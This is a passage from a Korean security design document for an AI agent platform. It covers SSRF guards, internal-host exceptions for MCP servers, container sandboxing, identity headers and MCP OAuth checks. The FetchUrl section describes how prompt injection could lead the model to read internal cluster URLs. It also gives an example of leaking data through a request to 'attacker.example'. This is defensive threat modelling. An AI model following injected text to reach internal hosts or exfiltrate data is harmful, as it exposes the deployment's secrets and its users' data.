IPv6 는 주소 하나에 철자가 여럿이므로, 텍스트가 아니라 8개 그룹으로 펼친 값으로 판정한다.
IPv4 를 안에 담는 접두사(IPv4-mapped, IPv4-compatible, NAT64 `64:ff9b::/96`, 6to4
`2002::/16`)는 통째로 막지 않고 **담긴 IPv4 로** 판정한다 — IPv6 전용 망에서 공인 주소에
닿는 정상 경로가 그것이기 때문이다. `64:ff9b::8.8.8.8` 은 통과하고 `64:ff9b::10.0.0.1` 은
거부된다.

디스패치는 `fetchPublicUrl`(`src/infrastructure/net/publicFetch.ts`)을 거치고, 그것이 단일
아웃바운드 경계다:

- DNS 는 **모든 요청과 모든 리다이렉트 홉마다** 다시 해석하고 다시 확인한다. 등록과 사용
  사이의 DNS 리바인딩 창을 (완전히 닫지는 못하지만) 좁힌다.
- 커넥션은 확인된 주소에 고정된다.
- 네이티브 리다이렉트 추종은 꺼져 있고 **교차 출처 리다이렉트는 거부한다**. 저장된 자격 증명이
  다른 호스트로 전달될 수 없게 하기 위해서다.
- 디스패처는 커넥션 재사용을 위해 `origin|pinned address` 별로 풀링된다. 이것이 캐시하는 것은
  **전송 계층뿐** 이다. 가드는 여전히 요청마다 돌기 때문에, 사설 주소로 해석되기 시작한
  호스트는 풀링된 디스패처에 닿기 전에 거부되고, 다른 곳으로 해석되는 호스트는 다른 키를
  받는다.

**모델 입력의 이미지는 URL로 가져가지 않는다.** OpenAI 호환 실행, AG-UI, A2A는 지원하는 이미지
바이트를 요청 안에 인라인으로 받으며, LLM 채널은 모든 `image_url`이 bounded `data:` URL인지
마지막으로 다시 확인한다. `https://`만 검사한 뒤 원격 URL을 제공자에게 그대로 넘기면 요청은 이
앱이 아니라 제공자 네트워크에서 발생한다. 그 경로에는 `fetchPublicUrl`의 DNS·주소·redirect
검사가 닿지 않으므로 허용하지 않는다. 모델이 웹의 이미지를 읽어야 하면 `FetchUrl` 도구가 이
앱의 아웃바운드 경계로 바이트를 가져와 같은 inline 형식으로 돌려준다.

공개 URL 이면 무엇이든 허용된다. 신뢰하는 엔드포인트만 등록하라. Registry endpoint URL 은
query parameter 와 fragment 를 받지 않는다. 둘은 멤버가 읽는 registry view 와 운영 로그에서
자격 증명을 노출하기 쉬우므로, 인증 정보는 encrypted header 또는 OAuth 연결에 둔다. 이전 행에
남은 query 와 fragment 는 dispatch 에만 쓰이고 reader-facing view 에서는 제거한다. 이 규칙은
**주소가 실제로 바뀔 때만** 적용한다. 저장된 주소를 그대로, 또는 콘솔이 보여 준 redacted 형태로
되돌려 보내는 저장은 이동이 아니므로 거절하지도, 저장된 credential 을 버리지도 않는다
(`resolveRegistryUrlPatch`). 그러지 않으면 편집 폼이 자기가 읽은 값을 되돌려 보내는 것만으로
레거시 항목이 다른 endpoint 를 가리키게 되고, 원래 주소는 다시 입력할 수도 없다.
LLM 채널도 endpoint 와 credential 을 한 보안 단위로 취급한다. 기본 채널의 URL 또는 provider
채널의 URL·인증 방식을 바꾸면 마스킹된 기존 key 를 새 주소로 옮기지 않고 새 key 입력을 요구한다.
기본 URL override 와 key override 를 함께 비우는 것은 둘 다 env 쌍으로 되돌리는 명시적 예외다.
외부 A2A Agent Card 의 실패 메시지는 origin 만 남긴다. query string 을 비롯한 전체 URL 자체가
자격 증명일 수 있으므로 authored error, chat, trace 에 등록 주소를 복사하지 않는다.

MCP 클라이언트는 `@modelcontextprotocol/client` 위에서 돌고, 가드는 그 옆에 놓이는 대신 그 안으로
**주입된다**. 트랜스포트에 `fetch` 로 주어지는 것이
`boundedFetch`(`src/infrastructure/mcp/session.ts`)이므로 프로브, 핸드셰이크, 모든 도구 호출,
세션 해제까지 전부 같은 경계를 지난다. SDK 를 자기 `fetch` 에 맡겨 두면 운영자가 넣은 URL 을
곧장 네트워크로 가져갈 것이다. 같은 래퍼가 응답 바이트 상한도 함께 나르는데, SDK 에는 그런 개념
자체가 없다.

### 선언된 내부 호스트

클러스터에서 이 앱이 부르기로 *되어 있는* MCP 서버들은 구조상 사설이다. Kubernetes Service 는
가드가 거부하는 ClusterIP 로 해석된다. `MCP_INTERNAL_HOST_SUFFIXES` 는 배포가 그 이름들이
무엇인지 밝히는 방법이다:

```
MCP_INTERNAL_HOST_SUFFIXES=agent-mcps.svc.cluster.local
```

선언된 접미사 아래의 호스트는 그 질문이 던져지는 모든 곳에서 public URL 가드를 건너뛴다.
항목을 등록할 때와 편집할 때, 콘솔의 "Test connection" 프로브, admin 이 항목의 OAuth 메타데이터를
읽을 때, project 자신의 도구 목록, 그리고 디스패치. 각각 `skipsUrlGuard` 를 통해서다. **차단된
주소 대역이 넓어지는 것은 아니다**. 다른 모든 항목은 여전히 원래 받던 검사를 받는다. 이것은
가드를 느슨하게 하는 것이 아니라 managed 루프백 옆에 놓인 두 번째 좁은 예외다.

내부 주소 예외도 자동 redirect 추종은 허용하지 않는다. MCP 세션·OAuth 메타데이터·내부
`FetchUrl`은 `src/infrastructure/net/redirectPolicy.ts`의 `fetchSameOrigin`을 통해 최대 5회만
같은 출처로 이동한다. 공개 URL도 같은 redirect 규칙을 사용하며, 각 요청 직전에 DNS를 검증하고
확인된 주소로 연결한다. 다른 출처로 이동하는 응답은 본문을 해제한 뒤 거부한다.

이름을 맞추는 술어는 하나다. `src/domain/security/internalHosts.ts` 의
`isDeclaredInternalHost`. 그리고 목록은 둘이다. `MCP_INTERNAL_HOST_SUFFIXES` 는 이 앱이
부르기로 되어 있는 서비스를, [`URL_FETCH_INTERNAL_HOST_SUFFIXES`](#모델이-고른-url) 는 모델이
읽어도 되는 페이지를 말하고, 두 목록은 의도적으로 서로를 모른다. 술어가 domain 의 중립 모듈에
있는 이유가 그것이다: `skipsUrlGuard`(MCP 쪽, provenance 와 합친 형태) 옆에 두면 `FetchUrl`
리더가 MCP 모듈을 import 하게 되는데, 그 리더는 MCP 목록을 읽어서는 안 된다.

그 좁음이 설계의 전부이고, 각 부분은 `tests/internalHosts.test.ts` 가 고정한다:

- **설정으로만.** 목록은 환경에서 온다. 레지스트리 항목이 자기 예외를 스스로 지정할 수 없고,
  의도적으로 런타임 설정이 *아니다*. 아웃바운드 경계를 넓히는 일은 그때 admin 을 쥔 사람이
  제출하는 폼이 아니라 배포를 거쳐야 한다.
- **레이블 단위로 고정.** `agent-mcps.svc.cluster.local` 은
  `mcp-url-fetch.agent-mcps.svc.cluster.local` 을 허용하고 `evil-agent-mcps.svc.cluster.local`
  은 거부한다. 단순한 "…로 끝난다"였다면 통과시켰을 아슬아슬한 경우다. 앞에 붙은 점은
  허용되며 같은 뜻이다.
- **단일 레이블 접미사는 없다.** `local` 이나 `internal` 은 이름 공간 하나를 통째로 허용하게
  된다. 의도라기보다 오타일 가능성이 훨씬 높으므로 존중하지 않는다.
- **IP 리터럴은 결코 안 된다.** 그 예외는 누군가 게시한 이름을 위한 것이다. 주소에는 맞출 이름이
  없으므로, 사설 주소는 여전히 provenance 로 자기 길을 얻어야 한다.
- **`http(s)` 만**, 그리고 userinfo 로 호스트 검사를 지나쳐 접미사를 밀반입할 수 없다.

그 대가: 그 접미사 아래의 호스트는 admin 이 저장할 수 있는 어떤 URL 로도 도달 가능해지고, 그것이
바로 가드가 평소에 없애는 능력이다. 그 서버들을 실제로 돌리는 네임스페이스만큼 접미사를
구체적으로 유지하라.

### managed 루프백 예외

managed MCP 서버(`runtime: "managed"`)는 이 앱이 자기 호스트에서 직접 띄운 컨테이너이고
`127.0.0.1:<port>` 로 닿는다. 운영자가 타이핑한 것이라면 가드가 정확히 거부할 주소다. 신뢰는
대신 **provenance** 에 놓인다. 프로비저너가 포트를 바인딩한 뒤 그 주소를 기록했다.

`isManagedLoopback`(`src/domain/mcp/types.ts`)이 이 우회가 적용되는지를 결정하는 유일한
자리이고, 의도적으로 좁다. 항목은 `managed` 를 주장해야 하고 **그리고** 리터럴 루프백 주소를
지녀야 한다:

- `127.0.0.1` 로 해석되는 호스트명은 거부된다. 확인과 요청 사이에 다른 곳으로 해석될 수 있다.
- 루프백을 가리키는 `remote` 항목은 거부된다. 그 주소는 타이핑된 것이다.
- 레지스트리는 managed 항목의 URL 을 옮기기를 거부한다.
- 라이프사이클 use case 는 프로비저너가 보고하더라도 루프백이 아닌 주소를 저장하기를 거부하고,
  그것이 지목한 컨테이너를 정지시킨다. 정지까지 실패하면 원래 거부와 cleanup 실패를 함께
  드러내며 컨테이너가 정리됐다고 주장하지 않는다.

프로비저너는 이미지 레퍼런스, 포트, 그리고 선택적인 **argv 배열** 을 받는다. 셸 명령은 결코 받지
않는다. 유일한 런타임인 Docker 프로비저너(`MANAGED_MCP_RUNTIME=docker`,
`src/infrastructure/mcp/dockerProvisioner.ts`)는 argv 를 `execFile` 로 Docker CLI 에 배열째
넘기고, 구조적으로 쓰이는 값. 이름(`MANAGED_NAME`), 이미지 레퍼런스, 환경 키·값, argv,
endpoint path. 은
`src/domain/mcp/provisioner.ts`의 패턴으로 API 입력과 Docker 실행 양쪽에서 검사한다. 항목을
편집할 수 있는 운영자가 그것으로 호스트에서 임의 코드를 돌릴 수는 없어야 한다. 호스트 파일
경로는 입력으로 받지 않으며, 저장된 환경 값만 프로세스가 만든 0600 임시 env file 로 전달한다.

컨테이너는 각각 메모리와 memory+swap을 모두 512MiB, CPU 1개, PID 256개로 제한하고 Linux
capability를 모두 버리며 `no-new-privileges`로 실행된다. root filesystem은 read-only이고
`/tmp`만 `noexec,nosuid` 64MiB tmpfs로 쓸 수 있다. 따라서 managed image는 영속 로컬 쓰기를
가정하면 안 된다. 한 호스트에는 managed 항목을 8개까지만 만들 수 있고 서로 다른 이름의 동시
생성도 count-then-create 구간에서 직렬화된다. 기존 항목의 restart·reconcile은 이 상한 때문에
막히지 않는다.

### MCP 서버가 호출자에 대해 듣는 것

런이 MCP 서버로 보내는 모든 요청은 호출하는 project 의 이름을 담은 `X-Tenant-Id` 를 싣는다
(`src/application/mcpMetadataHeaders.ts` 의 `TENANT_ID_HEADER`). 이것은 멀티테넌트 서버가.
mcp-memory 는 이것으로 자기 데이터를 스코프한다. project 별 등록 없이 project 마다 동작하도록
존재한다. 그것을 읽지 않는 서버는 무시하고, 이미 `X-Tenant-Id` 를 자기 테넌시 스위치로 다루는
서버는 우리 것에 반응하는데, 그게 이 일반적인 이름의 요점이다. 세 예약 헤더(`X-Tenant-Id`,
`X-User-Email`, `X-Conversation-Id`)의 저장된 표기는 병합 직후, OAuth 가용성 판정이 헤더 맵을
읽기 *전에* 한꺼번에 제거된다(`stripMcpMetadataHeaders`) — 그래서 저장된 metadata 헤더는 연결
없는 서버를 "인증하는 수단"으로 계산되지 않고, 런이든 probe 든 다른 project·사용자·대화를
사칭한 채 서버에 닿지 않는다. 플랫폼 자신의 값은 그 뒤에 찍히고, 테넌트는 세션의 헤더 맵에
실려 discovery 캐시가 project 별로 키잉된 상태를 유지한다. 카탈로그
재색인 프로브와 "Test connection" 은 project 를 지니지 않아 헤더를 보내지 않는다. 그것을
요구하는 서버는 그 목록 조회를 거부하고 서버 수준으로만 색인된다.

`user` 또는 `project-token` actor 가 일으킨 런은 `X-User-Email` 도 싣는다
(`src/application/mcpMetadataHeaders.ts` 의 `USER_EMAIL_HEADER`). 전자는 로그인 사용자, 후자는 token 이 대신하는 project
owner 의 email 이다. Slack 은 workspace user id 를 actor 로 유지하되 profile 에서 해석한 질문자의
email 을 별도로 싣는다. 이 값은 레지스트리/바인딩/OAuth header 를 모두 조립한 뒤 마지막에
적용하고, 어떤 대소문자 표기로 저장된 값도 먼저 제거한다. Telegram·Teams·A2A·trigger 처럼
email 을 알 수 없는 런은 header 를 보내지 않으며, 정적 header 로 사용자를 사칭할 수도 없다.
이 값은 MCP 서버가 Agent Memory 같은 사용자별 권한을 적용할 수 있게 하는 위임 신원이지, 그
자체가 credential 은 아니다. 서버는 별도의 Bearer token 이나 OAuth grant 와 함께 검증해야 한다.

Email 은 서버가 권한별 tool catalog 를 내놓거나 요청 자체를 거부할 수 있는 identity 이므로
`X-User-Email` 은 `X-Tenant-Id` 와 같은 세션 header 및 discovery cache key 에 포함한다. 권한 없는
사용자의 discovery 실패나 권한 있는 사용자의 catalog 가 다른 사용자에게 재사용되지 않는다.
로그인 사용자가 시작하는 registry "Test connection", project 별 도구 목록, prompt preview 도
같은 header 를 보낸다. 반면 catalog reindex 와 managed health probe 처럼 사용자가 없는 시스템
호출은 보내지 않는다.

콘솔의 project 별 도구 목록(`src/application/mcp/mcpAuthUseCases.ts` 의 `listTools`)은 project 를
*가지고 있으면서도* 테넌트를 보내지 않는 유일한 프로브다. 그 project 의 OAuth token 과 요청
사용자의 email 을 해석하고 런이 조립할 것과 같은 나머지 헤더를 조립한다. 테넌트별로 다른 도구를
노출하는 서버에서 소유자에게 보이는 목록은 따라서 그의 런에 제공되는 목록과 반드시 같지는 않다.

런이 대화 안에 있을 때는 그 옆에 헤더가 하나 더 실린다. `X-Conversation-Id`
(`CONVERSATION_ID_HEADER`, 같은 파일)에 런의 대화 키가 담긴다. `chat:{chatId}`,
`slack:{channel}:{threadTs}`, `a2a:{client}:{contextId}`, 또는 자기 `X-Conversation-Id` 를 보낸
호출자에게는 `api:{caller}:{value}`. 여기서 `{caller}` 는 actor 키의 다이제스트이며 **이 배포의
`AES_ENCRYPTION_KEY` 로 키잉된다**. 여기서는 한 호출자에 대해 안정적이라 서버가 그의 대화들을
구별할 수 있고, email 의 평범한 해시가 아니라서 주소 목록으로 오프라인에서 역산할 수 없다.
이것은 익명성이 아니라 가명이다. 같은 다이제스트를 두 번 본 서버는 같은 호출자가 두 번
물었다는 것을 알고, 그게 요점이다. 그리고 이 배포의 키가 없는 누구에게도 아무 의미가 없다.
테넌트와 똑같이 예약돼 있고 병합 이후에 찍히므로 바인딩이 다른 대화를 지목할 수 없다. 이것은
세션의 신원 헤더가 아니라 *컨텍스트* 헤더로 이동하므로 discovery 캐시를 키잉하지 않는다. 대화는
서버가 어떤 도구를 노출할지에 대해 아무것도 결정하지 않으며, 스레드마다 discovery 비용을 치르는
것은 결정한다고 가정하는 대가일 뿐이다. 발화(firing)에는 대화가 없어 아무것도 보내지 않고, 위의
프로브들도 보내지 않는다. 테넌트와 마찬가지로 이것은 아무것도 인증하지 않는다. 메모리 서버가
이것으로 작업 노트를 스코프해도 좋지만, 인가로 다뤄서는 안 된다.

이 세 header 가 자동으로 전송되는 신원 메타데이터다. 테넌트는 project 이름, 사용자 header 는
email actor 의 실제 주소, 대화는 불투명한 스레드 주소다. `X-User-Email` 은 PII filtering 보다
앞선 MCP discovery 부터 평문으로 전송되며 masking 대상이 아니다. 따라서 MCP 서버 등록은 사용자
email 공개를 포함하는 신뢰 결정이다. 서버는 그 밖에도 모델이 도구 인자에 넣은 값과, OAuth
항목이면 `Agent Studio — <project>` 라는 client 이름 및 연결한 사람의 grant 를 볼 수 있다.

### 모델이 고른 URL

위의 모든 것은 **운영자가 등록한** 주소에 관한 것이고, 거기서는 등록 시 검증이 첫 번째 통제이며
디스패치 시 확인이 두 번째다. 그 사이의 창을 닫는 것이 아니라 좁힌다. `FetchUrl` 빌트인에는
첫 번째 통제가 없다. 주소를 지목하는 것은 모델이고, 모델은 자기가 읽는 텍스트에 설득당한다.
`src/infrastructure/net/httpResource.ts` 가 그런 주소를 요청하는 유일한 자리이며, 그 규칙들은
심층 방어가 아니라 하중을 지고 있다:

- **MCP 의 내부 호스트 예외는 결코 참조하지 않는다.** `MCP_INTERNAL_HOST_SUFFIXES` 는 이 앱이 자기
  클러스터의 MCP 서비스에 닿을 수 있게 하려고 존재한다. 여기서 그것을 존중하면 프롬프트 인젝션
  하나가 `http://mcp-argocd.agent-mcps.svc.cluster.local/` 을 읽는 일로 바뀐다. 어댑터가
  `skipsUrlGuard` 를 import 하거나 그 목록·`process.env`·`lib/config` 에 닿기만 해도
  `tests/architecture.test.ts` 가 실패한다.
- **자기 목록은 따로 있다. `URL_FETCH_INTERNAL_HOST_SUFFIXES`.** 사내 위키나 내부 API 가
  구조상 사설 주소인 설치형 네트워크를 위한 것이고, composition root 가 주입하며 배포로만
  넓어진다. 그 접미사 아래의 호스트(`isDeclaredInternalHost`, 같은 술어, 같은 주의: 레이블
  경계, 단일 레이블 거부, IP 리터럴 거부, `http(s)` 만)는 **주소 가드 없이** 요청되지만, 나머지는
  그대로다: 같은 15초 타임아웃, 같은 두 헤더, 같은 리다이렉트 상한(5)이고, 리다이렉트는
  네이티브 추종 없이 홉마다 확인되어 **선언된 집합을 벗어나거나 출발 origin 을 벗어나면
  거부된다**. 예외가 리다이렉트 한 번으로 넓어져서는 안 되는 유일한 것이기 때문이다. 빈
  목록(기본)은 모든 모델 선택 URL 이 가드를 마주한다는 뜻이다. 그 대가는 MCP 목록의 것과
  같다: 접미사 아래의 모든 페이지가 프롬프트 인젝션 하나로 읽힌다. 정말로 모델이 읽어도 되는
  존만큼 좁게 선언하라.
- **아무것도 인증하지 않는다.** 테넌트 헤더 없음, MCP OAuth token 없음, Slack token 없음,
  호출자 헤더 전달 없음. 항상 GET 이고 본문은 결코 없다. 교차 출처 리다이렉트는 애초에 붙지
  않은 것을 전달할 수 없고. `fetchPublicUrl` 이 어차피 그것을 거부한다.
- **거부는 일반화된다.** `PublicFetchError` 는 자기가 거부한 호스트를 지목한다. 그것을 모델에게
  건네면 도구가 어떤 내부 이름이 존재하는지에 대한 오라클이 된다. 호출자는 "그 주소는 여기서
  도달할 수 없다"를 받고, 상세는 origin 만 로그로 간다. URL 자체가 자격 증명인 경우가 많다.
- **런당 제한된다.** `MAX_URL_FETCHES_PER_RUN`(20)은 요청의 *개수* 를 제한하는데, 다른 어떤
  예산도 그렇게 하지 않는다. "많은 요청, 전부 실패"는 네트워크 스윕이 취하는 모양이다.
- **기본은 꺼짐.** 버전이 `parameters.urlFetch` 로 옵트인한다. 그 capability 는 주입된
  의존성에서 파생되므로 Playground 프리뷰와 런이 서로 어긋날 수 없다.

**이것이 막지 못하는 것.** 공개돼 있지만 민감한 호스트. 파드의 이그레스 주소를 신뢰하는 IP
허용목록 기반 SaaS. 는 가드를 통과한다. 유출도 마찬가지다. `https://attacker.example/?leak=…`
을 요청하도록 설득당한 모델은 평범한 아웃바운드 요청을 하는 것이고, PII 필터링은 도움이 되지
않는다. fetch 에는 *복원된* 인자가 필요하기 때문이다(마스킹된 URL 은 해석되지 않는다). 이것은
아래에서 MCP 도구 인자에 대해 이미 말한 것과 같은 한계다. 차이는 URL 이 마찰이 더 적은 통로라는
점이다.

**그리고 그 대가.** 이 노출은 예전에도 있었지만, 자기 자격 증명이 하나도 없는 별도의 파드에
있었다. 이제는 AES 마스터 키, 데이터베이스 자격 증명, Slack token 을 쥐고 있는 앱 프로세스 안에서 돈다.
그래서 SSRF 인접 결함의 폭발 반경이 더 크고, 앱의 이그레스 정책은 열린 웹에 닿을 만큼 넓어야
한다. 완화된 것이지 제거된 것이 아니다.

## MCP OAuth

레지스트리 항목은 등록 시 한 번 발견된 `auth` 블록을 지닐 수 있다(RFC 9728 protected-resource
메타데이터 → RFC 8414 authorization-server 메타데이터). 두 문서 중 어느 쪽에서 꺼낸
엔드포인트든 URL 정책으로 다시 검증되고 `https` 여야 한다. **런 경로는 well-known 문서를 결코
가져오지 않는다.**

resource 문서는 항목 자신의 주소에서 읽으므로,
[선언된 내부 호스트](#선언된-내부-호스트)는 런이 다이얼하는 것과 같은 방식으로 읽힌다.
**authorization 서버는 그렇지 않다**. 그 URL 은 레지스트리가 아니라 제3자의 문서에서 나오고,
운영자가 어떤 MCP 호스트를 내부라고 선언한 것은 그 호스트가 스스로 지목하는 authorization
서버에 대해서는 아무 말도 하지 않는다.

자격 증명은 **project 별** 이며 자기 자신의 `PROJECT#<name> / MCPCONN#<server>` 아이템에 있다.
버전(설정 이력의 스냅샷)에도, project 아이템(그 `updatedAt` 은 publish 의 낙관적 동시성
조건이다)에도 있지 않다. 그 분리가 하나의 공유 레지스트리 항목이 project 마다 다른 제공자 앱을
섬길 수 있게 한다.

강제되는 속성:

- **PKCE S256 은 필수다.** `state` 는 10분 TTL 의 일회용이다. 명세의 MUST 대로,
  `code_challenge_methods_supported` 를 광고하지 않는 authorization 서버는 **기본적으로 거부**한다
 . `code_challenge` 를 무시하는 서버에 대고 진행하는 것은 code injection 방어를 조용히 내려놓는
  것이다. 광고 없이 PKCE 를 지원하는 서버는 흔하므로 `MCP_OAUTH_ALLOW_UNADVERTISED_PKCE=true` 가
  배포 단위로 그 위험을 받아들인다. 항목 단위가 아니라, 한 번.
- **authorization 서버 메타데이터는 명세의 순서로 찾고, `issuer` 를 검증한다.** 경로가 있는
  issuer 는 RFC 8414 path-inserted → OpenID path-inserted → OpenID path-appended 이고 root 형은
  시도하지 않는다; root 폴백은 Keycloak realm이나 Okta custom AS를 다른 issuer의 문서에
  조용히 바인딩할 수 있기 때문이다. `issuer`가 요청한 것과 다르거나 없는 문서는 쓰지 않는다.
  resource metadata 는 well-known 경로가 모두 빗나가면 서버 자신의 401 `WWW-Authenticate` 가
  지목하는 `resource_metadata` 주소를 읽는다(RFC 9728).
- **`WWW-Authenticate` 는 런타임에도 읽는다.** 403 `insufficient_scope` 가 이름 댄 scope 는
  연결의 scope 에 합쳐지고 연결은 `needs_reauth` 가 되어, 콘솔의 재연결이 서버가 방금 거절한
  것과 같은 grant 대신 넓어진 grant 를 요청한다(step-up). 전에는 403 이 "unreachable" 로 보여
  소유자가 scope 를 줄 길이 없었다. challenge 는 SDK 가 해당 요청의 typed error 에 붙인다. 한
  turn 에서 병렬 호출된 다른 tool 의 성공이나 403 이 이를 지우거나 바꿀 수 없다.
- **protected-resource metadata 는 resource 에 묶는다.** challenge 가 지목한 문서는 challenge 를
  일으킨 MCP URL, well-known 문서는 그 주소를 도출한 resource identifier 와 `resource` 값이
  정확히 같아야 쓴다(RFC 9728 §3.3). 다른 audience 의 token 을 받아 공격자 resource 에 보내는
  impersonation/confused-deputy 경로를 닫는다.
- **동적 등록은 토큰 요청이 쓸 인증 방식으로 등록한다**, 그리고 서버가 기록한 방식이 돌아오면
  그것을 연결에 적는다. `client_secret_post` 로 등록해 놓고 `client_secret_basic` 으로 교환하던
  것은 기록된 방식을 강제하는 서버(Keycloak, Authentik 등)에서 `invalid_client` 루프였다.
  `client_secret_basic` 의 ID 와 secret 은 RFC 6749 가 정한 form encoding 후 Base64 로 인코딩한다.
- **RFC 8707 `resource`** 는 모든 authorization 요청과 token 요청에 실린다. 명세가 그것을
  무조건으로 규정하며, 한 MCP 서버용으로 발급된 token 이 다른 서버에 재사용되는 것을 막는 것이
  바로 그것이다.
- **RFC 9207 `iss`** 는 code 를 교환하기 전에 검증된다(SEP-2468). 기대 issuer 는 PKCE verifier
  옆의 pending-state 아이템에 기록되며. 재발견이 바꿔 놓았을 수 있는 레지스트리 항목에서
  되읽지 *않는다*. **문자 그대로** 비교된다. 대소문자, 포트, 끝의 슬래시, 퍼센트 인코딩 정규화
  중 무엇도 하지 않는데, 각각이 서로 다른 두 issuer 가 같다고 비교될 또 하나의 방법이기
  때문이다. `iss` 가 없는 것은 서버의 메타데이터가
  `authorization_response_iss_parameter_supported` 를 광고할 때만 치명적이다. 같은 확인이 에러
  응답에도 돌기 때문에, 이 앱이 귀속시킬 수 없는 리다이렉트에서 온 제공자 제어
  `error_description` 텍스트는 결코 중계되지 않는다.
- **자격 증명에 대한 issuer 바인딩**(SEP-2352): 연결의 클라이언트 자격 증명은 그것이 등록된
  issuer 를 지니고, 그 token 은 발행될 때의 `resource` 를 지닌다. 무엇이든 건네주기 전에 둘 다
  확인된다. 갱신 경로에서 *그리고* 살아 있는 token 을 읽기만 하는 경로에서도. bearer token 에는
  audience 가 있고, 확인 없이 하나를 내주는 것은 클라이언트 시크릿을 쓰는 것과 같은 실수이기
  때문이다. **둘 다 기본값으로 채우는 것이 아니라 필수다.** 그것들이 기록되기 전에 쓰인 행은
  *연결 없음* 으로 되읽히고, 그래서 콘솔이 재연결을 제안한다. 예전의 폴백은 그런 행이 지금
  항목이 가리키는 것에 속한다고 가정했는데, 그 가정을 하지 않으려고 이 필드들이 존재하는 것이다
 . 그리고 추측에 대고 확인한 token 은 확인된 것이 아니다. issuer 를 지니지 않은 state 의
  pending authorization 에도 같은 것이 적용된다. 확인 없이 완료하는 대신 거부한다.
- **항목의 URL 을 편집하면 그 `auth` 블록은 통째로 버려진다.** 그 블록은 옛 주소의 well-known
  문서에서 읽은 것이다. 항목은 admin 이 Discover 를 다시 돌릴 때까지 자기 헤더로 되돌아간다.
  다시 돌리고 나면, 위의 두 확인이 옛 서버에 속했던 모든 연결을 잡아낸다. 항목을 지우고 같은
  이름으로 다시 만드는 것도 같은 방식으로 잡힌다. 레지스트리는 admin 소유인데 연결은 소유자
  소유이고 그 둘을 잇는 유일한 것이 이름이므로, 이것은 중요하다.
- **클라이언트를 얻는 방법은 명세 자신의 순서를 따른다**: 이미 보유한 자격 증명(한 번
  등록했거나 손으로 입력한 것), 그다음 Client ID Metadata Document, 그다음 동적 등록, 그다음
  소유자가 무엇을 해야 하는지 밝히는 에러. 등록은 프로토콜 `2026-07-28` 부터 그 문서 방식에
  밀려 deprecated 이므로 `client_id_metadata_document_supported` 를 광고하는 서버에는 결코
  등록하지 않는다. 하지만 그 밖에 아무것도 광고하지 않는 서버들을 위해 남겨 둔다. 2025년대
  릴리스의 authorization 서버가 전부 그렇다. 걷어냈다가 되돌린 적이 있다. 동작하던 연결을
  연결 불가능하게 만들고, 그 소유자에게 자기가 통제하지도 못하는 리비전 날짜를 두고 손으로
  앱을 등록하러 가라고 말하게 된다.
- **문서는 제공자가 그것을 가져올 수 있는 곳에서만 경로가 된다.** `client_id` 는
  *authorization 서버* 가 가져가는 URL 이므로, 공개 베이스가 `http://localhost` 이거나 내부
  호스트명인 배포는 아무 데도 해석되지 않는 것을 발행한다. 그리고 제공자는 사용자가 승인한
  *뒤에야* 그것을 *Unknown OAuth client* 라고 말하는데, 이는 URL 의 문제가 아니라 클라이언트의
  문제처럼 읽힌다. 그 주소는 항목 자신의 엔드포인트가 받는 것과 같은 https·공개 라우팅 가능
  확인을 받는다. 그것을 통과하지 못하면 등록으로 넘어가고, 넘어갈 등록이 없을 때의 거부는
  제공자가 아니라 베이스 URL 을 지목한다. 저장된 문서의 `client_id` 가 더 이상 이 배포가 제공할
  그것이 아니면 같은 이유로 다시 만들어진다. 그러지 않으면 행은 `clientId` 를 계속 갖고 있어
  모든 분기가 건너뛰어지고, 가져올 수 없는 같은 URL 이 영원히 제시된다.
- 동적 등록(RFC 7591)은 OpenID Connect 기본값이 적용되게 두는 대신
  `application_type: "web"` 을 선언한다(SEP-837). 시크릿이 없는 public 클라이언트는 서버의
  메타데이터가 무엇을 선호했든 `none` 을 보낸다.
- **Client ID Metadata Document 는 project 별로 공개 제공된다.**
  `/api/mcps/oauth/client-metadata/{project}` 이며, 세션 확인이 없는 유일한 MCP 라우트이고
  의도적으로 그렇다. 그 독자는 URL 인 `client_id` 를 해석하는 authorization 서버이며, 제공자가
  도는 어디에서든 쿠키 없이 도착한다. 그 안에는 시크릿이 하나도 없다. 이 배포의 이름과 자신이
  받아들이는 단 하나의 redirect URI 를 밝히는데, 그것은 예전에 등록이 POST 본문으로 보내던
  것이다. 그 안의 `client_id` 는 그것을 가져온 URL 과 같아야 하므로, 둘 다 하나의
  함수(`clientMetadataUrl` / `clientMetadataDocument`)가 **설정된** 공개 베이스에서 만든다.
  요청에서 만드는 일은 결코 없다. 요청에서 만들면 호출자가 자기 호스트로의 리다이렉트를 승인하는
  문서를 게시할 수 있게 된다. project 는 조회하지 않는다. 요청마다 데이터베이스를 읽는 공개
  엔드포인트는 인증되지 않은 트래픽을 그 안으로 초대하는 셈이고, 모르는 이름에 404 를 주면 어떤
  project 가 존재하는지가 새어 나간다. 존재하지 않는 project 의 문서는 무해하다. 그것이 시작할
  수 있는 authorization 은 콜백에 도착하고, 콜백은 연결을 찾지 못해 멈춘다.
- **그런 클라이언트는 구조상 public 이므로**, 이 플로우의 방어는 공유 시크릿이 아니라 PKCE 와 그
  고정된 redirect URI 다. 다른 누군가가 시작한 authorization 도 결국 자기 code 를 이 배포의
  콜백으로 배달하고, 거기서는 verifier 없이는 쓸모가 없다.
- **위의 issuer 바인딩 규칙은 그것에 대해서는 뒤집힌다.** 등록했거나 손으로 입력한 `client_id`
  는 그것을 발급한 서버를 떠나면 의미가 없고, 그래서 issuer 로 키잉되며 issuer 가 바뀌면 다시
  등록된다. 또는 여기서 다시 발급할 수 있는 것이 아무것도 없을 때는, 소유자가 등록해야 하는
  서버를 지목하며 거부된다. 메타데이터 문서의 `client_id` 는 자체 호스팅되고 요청받은 서버가
  그때그때 해석하므로 항목이 옮겨져도 살아남는다. 그것을 거부하는 것은 가지고 있지도 않은 자격
  증명을 이유로 동작하던 연결을 깨뜨리는 일이 될 것이다.
- 콜백은 **project 소유권을 다시 확인한다.** 사용자가 제공자에 가 있는 동안 소유권이 바뀔 수 있기
  때문이다.

갱신은 저장된 refresh token 에 대한 compare-and-set 이다. refresh token 을 회전시키는 제공자는
이전 것을 폐기하므로, 경쟁에서 진 쪽은 이긴 쪽의 token 을 쓴다. **거절된 grant** 만이 연결을
`needs_reauth` 로 표시한다. 5xx 나 타임아웃은 그대로 둔다. (갱신 타이밍은 보안 제약이 아니라
설계 제약이다. [design/mcp.md](design/mcp.md#oauth) 참고.)

연결은 서버를 게이트하는 것이 아니라 자격 증명을 **공급한다**. 해석된 token 은 디스패치 시
마지막에 적용된다. 레지스트리 항목의 헤더와 버전의 오버라이드 위에. 그래서 버전이 project 의
연결 대신 자기 `Authorization` 을 끼워 넣을 수 없다. 사용할 수 있는 연결이 없으면 서버는 그
